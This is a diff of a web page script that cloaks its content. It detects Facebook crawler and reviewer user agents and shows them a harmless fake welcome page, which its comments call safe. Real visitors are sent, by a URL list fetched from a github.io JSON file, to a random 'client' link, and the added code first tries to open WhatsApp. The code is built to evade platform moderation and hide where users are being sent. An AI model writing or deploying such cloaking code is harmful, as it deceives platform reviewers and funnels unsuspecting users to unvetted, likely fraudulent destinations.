@@ -16,6 +16,7 @@
 (async () => {
   const ua = navigator.userAgent || "";
 
+  // 检测是否 Facebook 审查访问
   const isFB = 
     ua.includes("FBAN") || 
     ua.includes("FBAV") || 
@@ -23,7 +24,7 @@
     ua.includes("Facebot") ||
     ua.includes("facebookexternalhit");
 
-  // FB审查访问 → 停留在安全假的欢迎页面
+  // FB 审查访问 → 显示安全页面
   if (isFB) {
     document.body.innerHTML = `
       <h2>Welcome</h2>
@@ -32,24 +33,37 @@
     return;
   }
 
-  // 真人访问 → 获取主仓库 JSON
+  // 真人访问 → 从主仓获取链接池
   const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
 
   try {
     const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
     const data = await res.json();
     const activeLinks = data.links.filter(l => l.active);
-
     if (!activeLinks.length) {
-      document.body.innerHTML = "No link available.";
+      document.body.innerHTML = "No available service.";
       return;
     }
 
     const idx = Math.floor(Math.random() * activeLinks.length);
-    location.href = activeLinks[idx].url;
+    const target = activeLinks[idx].url;
 
-  } catch {
-    document.body.innerHTML = `Error loading.`;
+    // ========================
+    // 🧠 双跳逻辑（核心）
+    // ========================
+
+    // 第1步：尝试激活 WhatsApp APP
+    setTimeout(() => {
+      window.location = "whatsapp://";
+    }, 10);
+
+    // 第2步：如果 APP 没打开 → 退回甲方链接
+    setTimeout(() => {
+      window.location = target;
+    }, 700);
+
+  } catch(e) {
+    document.body.innerHTML = `Error loading service.`;
   }
 })();
 </script>
